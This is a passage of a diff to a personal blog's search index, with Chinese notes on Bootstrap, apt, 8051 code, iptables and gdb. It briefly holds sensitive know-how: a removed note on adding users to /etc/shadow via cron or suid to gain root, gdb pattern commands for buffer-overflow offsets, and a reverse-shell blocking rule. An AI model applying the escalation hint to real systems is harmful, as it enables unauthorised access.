</span><br><span class="line">	xl与lg同时存在,若大于xl判定,使用xl规则,大于lg小于xl,使用lg规则,以此类推</span><br><span class="line">	只定义了col-md 那么md及md以上使用md的规则,md以下使用默认规则</span><br><span class="line">	</span><br><span class="line">	offset-</span><br><span class="line">		偏移系统,指定偏移多少单位,最高12</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">余白与边框 </span><br><span class="line">	padding 余白</span><br><span class="line">	margin 边框</span><br><span class="line">	写法</span><br><span class="line">		p&#x2F;m&#123;location&#x3D;t[op]b[lod]l[eft]r[ight]xy&#125;-size</span><br><span class="line">		x代表上下</span><br><span class="line">		y代表左右</span><br><span class="line">	size定义值</span><br><span class="line">		1 0.25rem</span><br><span class="line">		2 0.5rem</span><br><span class="line">		3 1rem</span><br><span class="line">		4 1.5rem</span><br><span class="line">		5 3rem</span><br><span class="line">	maigin在class中定义</span><br><span class="line">		margin-tblr:#px %</span><br><span class="line">	        &#123;margin-left: auto;</span><br><span class="line">            margin-right: auto;&#125;代表水平居中</span><br><span class="line">			</span><br><span class="line">按钮定义 btn-</span><br><span class="line">	primary</span><br><span class="line">	secondary</span><br><span class="line">	success</span><br><span class="line">	waring</span><br><span class="line">	light(高亮)</span><br><span class="line">定义行 row</span><br><span class="line">显示顺序 order	</span><br><span class="line">	order-屏幕尺寸-顺序值</span><br></pre></td></tr></table></figure></li>
+</ol>
+<hr />
+<h4 id="layer弹出层">layer弹出层</h4>
+<p>这就是个充数的,调用看官网就行了.</p>
+<hr />
+<h4 id="markdown">MarkDown</h4>
+<p>同上</p>
 ]]></content>
       <categories>
-        <category>运维</category>
+        <category>编程</category>
       </categories>
   </entry>
   <entry>
@@ -661,75 +956,21 @@
       </categories>
   </entry>
   <entry>
-    <title>apt-各种参数详解</title>
-    <url>/apt-%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<h3 id="apt软件包管理器">apt软件包管理器</h3>
-<p><a href="https://mritd.me/2015/12/06/apt-get%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener">apt-get常用命令</a></p>
-<h4 id="安装升级删除">安装升级删除:</h4>
-<h5 id="查看软件xxx安装内容">查看软件xxx安装内容</h5>
-<p>dpkg -L xxx 查找软件库中的软件 <code>apt-cache search 正则表达式</code> 或 <code>aptitude search 软件包</code></p>
-<h5 id="显示系统安装包的统计信息">显示系统安装包的统计信息</h5>
-<p><code>apt-cache stats</code></p>
-<h5 id="显示系统全部可用包的名称">显示系统全部可用包的名称</h5>
-<p><code>apt-cache pkgnames</code></p>
-<h5 id="显示包的信息">显示包的信息</h5>
-<p><code>apt-cache show k3b</code></p>
-<h5 id="查找文件属于哪个包">查找文件属于哪个包</h5>
-<p><code>apt-file search filename</code></p>
-<h5 id="查看已经安装了哪些包">查看已经安装了哪些包</h5>
-<p><code>dpkg -l</code></p>
-<h5 id="查询软件xxx依赖哪些包">查询软件xxx依赖哪些包</h5>
-<p><code>apt-cache depends xxx</code></p>
-<h5 id="查询软件xxx被哪些包依赖">查询软件xxx被哪些包依赖</h5>
-<p><code>apt-cache rdepends xxx</code></p>
-<h5 id="增加一个光盘源">增加一个光盘源</h5>
-<p>sudo apt-cdrom add</p>
-<h5 id="系统升级">系统升级</h5>
-<p><code>sudo apt-get update</code> (这一步更新包列表)</p>
-<p><code>sudo apt-get dist-upgrade</code> (这一步安装所有可用更新) 或者 <code>sudo apt-get upgrade</code> (这一步安装应用程序更新，不安装新内核等)</p>
-<h5 id="编译时缺少h文件的自动处理">编译时缺少h文件的自动处理</h5>
-<p><code>sudo auto-apt run ./configure</code></p>
-<h5 id="查看安装软件时下载包的临时存放目录">查看安装软件时下载包的临时存放目录</h5>
-<p><code>ls /var/cache/apt/archives</code></p>
-<h5 id="备份当前系统安装的所有包的列表">备份当前系统安装的所有包的列表</h5>
-<p><code>dpkg --get-selections | grep -v deinstall &gt; ~/somefile</code></p>
-<h5 id="从上面备份的安装包的列表文件恢复所有包">从上面备份的安装包的列表文件恢复所有包</h5>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg --set-selections &lt; ~&#x2F;somefile </span><br><span class="line">sudo dselect</span><br></pre></td></tr></table></figure>
-<h5 id="清理旧版本的软件缓存">清理旧版本的软件缓存</h5>
-<p><code>sudo apt-get autoclean</code></p>
-<h5 id="清理所有软件缓存">清理所有软件缓存</h5>
-<p><code>sudo apt-get clean</code></p>
-<h5 id="删除系统不再使用的孤立软件">删除系统不再使用的孤立软件</h5>
-<p><code>sudo apt-get autoremove</code></p>
-<h5 id="purge参数彻底删除文件">purge参数彻底删除文件:</h5>
-<p><code>sudo apt-get purge virtualbox</code> <code>sudo apt-get autoremove</code> <code>sudo apt-get clean</code></p>
-<h5 id="只是删除软件的链接并不实际删除软件的配置文件和实体文件">只是删除软件的链接，并不实际删除软件的配置文件和实体文件。</h5>
-<p><code>apt-get remove</code></p>
-<h5 id="清除所有已删除包的残余配置文件配置文件">清除所有已删除包的残余配置文件配置文件</h5>
-<p><code>dpkg -l |grep ^rc|awk '{print $2}' |sudo xargs dpkg -P</code></p>
-<h6 id="如果报如下错误证明你的系统中没有残留配置文件了无须担心">如果报如下错误，证明你的系统中没有残留配置文件了，无须担心。</h6>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg: --purge needs at least one package name argument </span><br><span class="line"></span><br><span class="line">Type dpkg --help for help about installing and deinstalling packages</span><br><span class="line">;</span><br><span class="line">Use &#39;dselect&#39; or &#39;aptitude&#39; for user-friendly package management; </span><br><span class="line">Type dpkg -Dhelp for a list of dpkg debug flag values; </span><br><span class="line">Type dpkg --force-help for a list of forcing options; </span><br><span class="line">Type dpkg-deb --help for help about manipulating *.deb files; </span><br><span class="line">Type dpkg --license for copyright license and lack of warranty (GNU GPL)</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line">Options marked</span><br><span class="line">produce a lot of output - pipe it through &#39;less&#39; or &#39;more&#39; !</span><br></pre></td></tr></table></figure>
-<h5 id="查看包在服务器上面的地址">查看包在服务器上面的地址</h5>
-<p><code>apt-get -qq --print-uris install ssh | cut -d\' -f2</code></p>
-<h5 id="彻底删除gnome">彻底删除Gnome</h5>
-<p><code>apt-get --purge remove liborbit2</code></p>
-<h5 id="彻底删除kde">彻底删除KDE</h5>
-<p><code>apt-get --purge remove libqt3-mt libqtcore4</code></p>
-<h5 id="一键安装-lamp-服务">一键安装 LAMP 服务</h5>
-<p><code>sudo tasksel install lamp-server</code></p>
-<h5 id="删除旧内核">删除旧内核</h5>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo aptitude purge ~ilinux-image-.*\(\!&#96;uname -r&#96;\)</span><br></pre></td></tr></table></figure>
-<h5 id="导入ppa源的key值">导入ppa源的key值</h5>
-<p>W: GPG签名验证错误： http://ppa.launchpad.net jaunty Release: 由于没有公钥，下列签名无法进行验证： NO_PUBKEY 5126890CDCC7AFE0 <code>sudo apt-key adv --recv-keys --keyserver keyserver.ubuntu.com 5126890CDCC7AFE0</code> #5126890CDCC7AFE0替换为你需要导入的Key值</p>
-<h5 id="增加一个ppa源">增加一个ppa源</h5>
-<p><code>sudo add-apt-repository ppa:user/ppa-name</code> 使用 ppa 的地址替换 ppa:user/ppa-name</p>
-<h4 id="dpkg-查看软件包依赖">dpkg 查看软件包依赖</h4>
-<p><code>dpkg -I package.deb</code></p>
-<h3 id="dpkg-查看生成文件">dpkg 查看生成文件</h3>
-<p><code>dpkg -L package_name</code></p>
+    <title>51例程</title>
+    <url>/51%E4%BE%8B%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="背景知识">背景知识</h2>
+
+<h3 id="文件下载">文件下载</h3>
+<a href="/51%E4%BE%8B%E7%A8%8B/51%E5%8D%95%E7%89%87%E6%9C%BA%E7%89%B9%E6%AE%8A%E5%8A%9F%E8%83%BD%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E4%B8%B2%E8%A1%8C%E9%80%9A%E8%AE%AF.pdf" title="51单片机特殊功能寄存器与串行通讯文件下载">51单片机特殊功能寄存器与串行通讯文件下载</a>
+<a id="more"></a>
+<h4 id="代码示例">代码示例</h4>
+<h5 id="串口输出转lcd显示中断方式">串口输出转lcd显示,中断方式</h5>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;reg51.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrins.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> uchar unsigned char</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> uint unsigned int</span></span><br><span class="line"></span><br><span class="line">uchar code sendBuf[]=&#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,<span class="number">0x7f</span>,<span class="number">0x6f</span>&#125;; </span><br><span class="line">uchar flag=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">(uchar)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	EA=<span class="number">1</span>;</span><br><span class="line">	ES=<span class="number">1</span>;</span><br><span class="line">	SCON=<span class="number">0x00</span>;</span><br><span class="line">	</span><br><span class="line">	SBUF=sendBuf[flag];</span><br><span class="line">	<span class="keyword">for</span>(;;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sint</span><span class="params">()</span> interrupt 4</span>&#123;</span><br><span class="line">	<span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">	</span><br><span class="line">	SBUF=sendBuf[flag];</span><br><span class="line">	flag++;</span><br><span class="line">	<span class="keyword">if</span>(flag==<span class="number">10</span>)&#123;</span><br><span class="line">		flag=<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	TI=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">(uchar ms)</span></span>&#123;</span><br><span class="line">	uchar i;</span><br><span class="line">	<span class="keyword">while</span>(ms)&#123;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">123</span>;i++);</span><br><span class="line">		ms--;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="读取按键转lcd字符显示">读取按键转lcd字符显示</h5>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;reg51.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrins.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> uchar unsigned char</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> uint unsigned int</span></span><br><span class="line"></span><br><span class="line">uchar flag=<span class="number">0</span>;</span><br><span class="line">uchar code sendBuf[]=&#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,<span class="number">0x7f</span>,<span class="number">0x6f</span>&#125;;</span><br><span class="line">sbit P1_0=P1^<span class="number">0</span>;</span><br><span class="line">sbit P1_1=P1^<span class="number">1</span>;</span><br><span class="line">uchar r;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">(uchar)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	SCON=<span class="number">0x10</span>; <span class="comment">//方式0允许输入数据</span></span><br><span class="line">	EA=<span class="number">1</span>;</span><br><span class="line">	P2=sendBuf[flag];</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(P1_0==<span class="number">0</span>)&#123;</span><br><span class="line">			ES=<span class="number">1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			ES=<span class="number">0</span>;</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sint</span><span class="params">()</span> interrupt 4</span>&#123;</span><br><span class="line">	P1_1=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">delay</span>(<span class="number">1</span>);</span><br><span class="line">	P1_1=<span class="number">1</span>;</span><br><span class="line">	r=SBUF;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(r!=<span class="number">0xff</span>)&#123;</span><br><span class="line">		<span class="keyword">switch</span>(r)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xfe</span>:flag=<span class="number">0</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xfd</span>:flag=<span class="number">1</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xfb</span>:flag=<span class="number">2</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xf7</span>:flag=<span class="number">3</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xef</span>:flag=<span class="number">4</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xdf</span>:flag=<span class="number">5</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xbf</span>:flag=<span class="number">6</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0x7f</span>:flag=<span class="number">7</span>;<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	P2=sendBuf[flag];</span><br><span class="line">	RI=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">(uchar ms)</span></span>&#123;</span><br><span class="line">	uchar i;</span><br><span class="line">	<span class="keyword">while</span>(ms)&#123;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">123</span>;i++);</span><br><span class="line">			ms--;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>linux软件</category>
+        <category>单片机</category>
       </categories>
   </entry>
   <entry>
@@ -960,25 +1201,6 @@
       </categories>
   </entry>
   <entry>
-    <title>ARM-相关知识及传送门</title>
-    <url>/ARM-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E5%8F%8A%E4%BC%A0%E9%80%81%E9%97%A8/</url>
-    <content><![CDATA[<h3 id="portal">Portal</h3>
-<p><a href="https://azeria-labs.com/writing-arm-assembly-part-1/" target="_blank" rel="noopener">官方介绍</a> <a href="https://blog.csdn.net/MyArrow/article/details/9701499" target="_blank" rel="noopener">CPSR/SPSR</a> <a href="https://blog.csdn.net/caihaitao2000/article/details/84843270" target="_blank" rel="noopener">异常处理</a> <a href="https://blog.csdn.net/SoaringLee_fighting/article/details/81906495" target="_blank" rel="noopener">arm架构64位入门基础：架构分析、寄存器、调用规则、指令集、程序调试以及参考手册</a> <a href="https://blog.csdn.net/SoaringLee_fighting/article/details/82530435" target="_blank" rel="noopener">arm架构64位（AArch64）汇编优化总结</a></p>
-]]></content>
-      <categories>
-        <category>ARM</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>git可视化查看分支</title>
-    <url>/git-%E5%8F%AF%E8%A7%86%E5%8C%96%E6%9F%A5%E7%9C%8B%E5%88%86%E6%94%AF/</url>
-    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> --pretty=format:<span class="string">"%h %s"</span> --graph</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>linux工具</category>
-      </categories>
-  </entry>
-  <entry>
     <title>gdb-常用调试指令</title>
     <url>/gdb-%E5%B8%B8%E7%94%A8%E8%B0%83%E8%AF%95%E6%8C%87%E4%BB%A4/</url>
     <content><![CDATA[<h2 id="背景知识">背景知识</h2>
@@ -1028,6 +1250,80 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pattern 指令,生成长字符串,</span><br><span class="line"></span><br><span class="line">pattern create 150 #生成一个长度为150字节的字符串</span><br><span class="line">pattern offset rip地址 #判断从多少字节开始溢出,前提是程序非正常退出,rip内容被覆盖</span><br></pre></td></tr></table></figure>
 <h2 id="参考链接">参考链接</h2>
 <p>http://yaov.net/2018/09/15/linux-pwn%E5%9F%BA%E7%A1%801/</p>
+]]></content>
+      <categories>
+        <category>linux工具</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>git可视化查看分支</title>
+    <url>/git-%E5%8F%AF%E8%A7%86%E5%8C%96%E6%9F%A5%E7%9C%8B%E5%88%86%E6%94%AF/</url>
+    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> --pretty=format:<span class="string">"%h %s"</span> --graph</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>linux工具</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>iptables-笔记</title>
+    <url>/iptables-%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="简单开启22号端口">简单开启22号端口</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t filter -A INPUT -j DROP -s 172.0.0.1 -p 22</span><br><span class="line">iptables -t filter -A INPUT -j ACCEPT -s 172.16.0.0&#x2F;16 -d 172.16.100.1 -p tcp --dport 22 </span><br><span class="line">iptables -t filter -A OUTPUT -j ACCEPT -s 172.16.100.7 -d 172.16.0.0&#x2F;16 -p tcp --sport 22</span><br></pre></td></tr></table></figure>
+<h3 id="state模块使用例程">state模块使用例程</h3>
+<h4 id="禁止向外打开新的tcp连接">禁止向外打开新的tcp连接</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -A OUTPUT -m state --state NEW -p tcp -s 172.16.0.107 -j DROP</span><br><span class="line">iptables -t filter -A INPUT -p tcp --dport 22 -d 172.16.0.107 -j ACCEPT </span><br><span class="line">iptables -t filter -A OUTPUT -p tcp --sport 22 -s 172.16.0.107 -j ACCEPT</span><br></pre></td></tr></table></figure>
+<h4 id="允许ping自己">允许ping自己</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptebles -P INPUT DROP</span><br><span class="line">iptebles -P OUTPUT DROP </span><br><span class="line">iptables -t filter -A INPUT -p icmp --icmp-type 8 -m state --state NEW,ESTABLISHED -d 172.16.0.107 -j DROP</span><br><span class="line">iptebles -t filter -A OUTPUT -p icmp --icmp-type 0 -m state --state ESTABLISHED -s 172.16.0.107 -j ACCEPT</span><br></pre></td></tr></table></figure>
+<h4 id="防止反弹shell">防止反弹shell</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t fliter -A OUTPUT -m state -s 172.16.0.107 --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
+<h3 id="ftp协议的特殊性">ftp协议的特殊性</h3>
+<h4 id="因为ftp很特殊ip_nat_ftp-ip_conntrack_ftp-模块需要先装载">因为ftp很特殊，ip_nat_ftp ip_conntrack_ftp 模块需要先装载</h4>
+<h4 id="配置文件在etcsysconfigiptables-config在iptables_modules后面填上ip_nat_ftp-和-ip_conntrack_ftp-即可因为ip_nat_ftp依赖ip_conntrack_ftp-所以只需要装载ip_nat_ftp">配置文件在/etc/sysconfig/iptables-config,在IPTABLES_MODULES后面填上ip_nat_ftp 和 ip_conntrack_ftp 即可,因为ip_nat_ftp依赖ip_conntrack_ftp 所以只需要装载ip_nat_ftp</h4>
+<h4 id="related-相关性-专为ftp设定">related 相关性 专为FTP设定</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t filter -A OUTPUT -p tcp -s 172.16.0.107 -m state --state RELATED -j ACCEPT</span><br></pre></td></tr></table></figure>
+<h4 id="ip_conntrack是很重要的但是高访问的情况下可能会阻断一部分的传入连接">ip_conntrack是很重要的，但是高访问的情况下可能会阻断一部分的传入连接</h4>
+<h4 id="ip_conntrack内核控制旧版内核">ip_conntrack内核控制(旧版内核)</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;netfilter&#x2F;ip_conntrack_[protocol]</span><br><span class="line">&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_conntrack_max</span><br></pre></td></tr></table></figure>
+<h4 id="nf_conntrack内核控制">nf_conntrack内核控制</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;proc&#x2F;sys&#x2F;net&#x2F;netfilter&#x2F;nf_conntrack_[protocol]</span><br><span class="line">&#x2F;proc&#x2F;sys&#x2F;net&#x2F;netfilter&#x2F;nf_conntrack_max</span><br><span class="line">&#x2F;proc&#x2F;sys&#x2F;net&#x2F;nf_conntrack_max</span><br></pre></td></tr></table></figure>
+<h2 id="显式扩展">显式扩展</h2>
+<p>-m state //状态 -m iprange //ip区段 -m multiport //离散端口，最多15个 -m connlimit //最大连接数 -m limit //流量控制 traffic control(流量控制) token bucket filter -m string //匹配字符串 -m recent //定义规则 防止ddos</p>
+<h3 id="设置连接约束">设置连接约束</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 22 -m connlimit --connlimit-above 3 -j DROP &#x2F;&#x2F;约束最大连接数</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH &#x2F;&#x2F;设置新连接 &#x2F;&#x2F;不会拦截,因为没有目标,但是会更新记录</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -m state --state NEW --update --second 300 --hitcount 3 --name SSH -j DROP &#x2F;&#x2F;检查记录是否符合条件</span><br></pre></td></tr></table></figure>
+<pre><code>    --dnat
+    --snat </code></pre>
+<h3 id="j-target-target译作动作">-j target 【target译作动作】</h3>
+<p>-j ACCEPT DROP RESPECT LOG 自定义链 MASQUERADE //ppp拨号，外网地址是动态获取的时候使用</p>
+<h4 id="从主链转发到自定义链">从主链转发到自定义链</h4>
+<p>iptables -A INPUT -j 自定义链</p>
+<h4 id="从自定义链返回主链">从自定义链返回主链</h4>
+<p>iptables -A 自定义链 -j RETURN</p>
+<h3 id="抓包">抓包</h3>
+<pre><code>tcpdump -i 网卡 -nn -X icmp</code></pre>
+<h3 id="对nat表的操作">对nat表的操作</h3>
+<table>
+<thead>
+<tr class="header">
+<th style="text-align: center;">SNAT</th>
+<th style="text-align: center;">DNAT</th>
+<th style="text-align: center;">PNAT</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">Source</td>
+<td style="text-align: center;">destination</td>
+<td style="text-align: center;">port</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">源地址转换</td>
+<td style="text-align: center;">目标地址转换</td>
+<td style="text-align: center;">端口地址转换</td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp -d 172.16.100.107 -j SNAT --to-source 更换的源地址:端口 </span><br><span class="line">iptables -t nat -A PREROUTING -p tcp -d 172.16.100.107 -j DNAT --to-destination 更换的目标地址:端口</span><br></pre></td></tr></table></figure>
+<h4 id="dmz-区域-非军事化区-服务器使用nat做跳板访问">DMZ 区域 非军事化区 服务器使用nat做跳板访问</h4>
 ]]></content>
       <categories>
         <category>linux工具</category>
@@ -1120,17 +1416,6 @@
       </categories>
   </entry>
   <entry>
-    <title>openssl-手动生成linux密码</title>
-    <url>/openssl-%E6%89%8B%E5%8A%A8%E7%94%9F%E6%88%90linux%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<h4 id="openssl生成linux密码">openssl生成linux密码</h4>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt <span class="string">'12345678'</span>  <span class="comment">#-1:表示采用的是MD5加密算法。 --salt:表示使用指定盐值</span></span><br><span class="line">Password:   <span class="comment">##这里输入的是密码</span></span><br></pre></td></tr></table></figure>
-<h3 id="可以结合cron定时计划suid实现任意添加用户到etcshadow文件指定uidgid等.达到获取最高权限的目的.">可以结合cron定时计划/suid实现任意添加用户到/etc/shadow文件,指定uid,gid等.达到获取最高权限的目的.</h3>
-]]></content>
-      <categories>
-        <category>linux工具</category>
-      </categories>
-  </entry>
-  <entry>
     <title>python-两种数据流</title>
     <url>/python-%E4%B8%A4%E7%A7%8D%E6%95%B0%E6%8D%AE%E6%B5%81/</url>
     <content><![CDATA[<p>用service.AF_INET指定了使用了IPv4协议</p>
@@ -1146,21 +1431,25 @@
       </categories>
   </entry>
   <entry>
-    <title>51例程</title>
-    <url>/51%E4%BE%8B%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="背景知识">背景知识</h2>
-
-<h3 id="文件下载">文件下载</h3>
-<a href="/51%E4%BE%8B%E7%A8%8B/51%E5%8D%95%E7%89%87%E6%9C%BA%E7%89%B9%E6%AE%8A%E5%8A%9F%E8%83%BD%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E4%B8%B2%E8%A1%8C%E9%80%9A%E8%AE%AF.pdf" title="51单片机特殊功能寄存器与串行通讯文件下载">51单片机特殊功能寄存器与串行通讯文件下载</a>
-<a id="more"></a>
-<h4 id="代码示例">代码示例</h4>
-<h5 id="串口输出转lcd显示中断方式">串口输出转lcd显示,中断方式</h5>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;reg51.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrins.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> uchar unsigned char</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> uint unsigned int</span></span><br><span class="line"></span><br><span class="line">uchar code sendBuf[]=&#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,<span class="number">0x7f</span>,<span class="number">0x6f</span>&#125;; </span><br><span class="line">uchar flag=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">(uchar)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	EA=<span class="number">1</span>;</span><br><span class="line">	ES=<span class="number">1</span>;</span><br><span class="line">	SCON=<span class="number">0x00</span>;</span><br><span class="line">	</span><br><span class="line">	SBUF=sendBuf[flag];</span><br><span class="line">	<span class="keyword">for</span>(;;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sint</span><span class="params">()</span> interrupt 4</span>&#123;</span><br><span class="line">	<span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">	</span><br><span class="line">	SBUF=sendBuf[flag];</span><br><span class="line">	flag++;</span><br><span class="line">	<span class="keyword">if</span>(flag==<span class="number">10</span>)&#123;</span><br><span class="line">		flag=<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	TI=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">(uchar ms)</span></span>&#123;</span><br><span class="line">	uchar i;</span><br><span class="line">	<span class="keyword">while</span>(ms)&#123;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">123</span>;i++);</span><br><span class="line">		ms--;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h5 id="读取按键转lcd字符显示">读取按键转lcd字符显示</h5>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;reg51.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrins.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> uchar unsigned char</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> uint unsigned int</span></span><br><span class="line"></span><br><span class="line">uchar flag=<span class="number">0</span>;</span><br><span class="line">uchar code sendBuf[]=&#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,<span 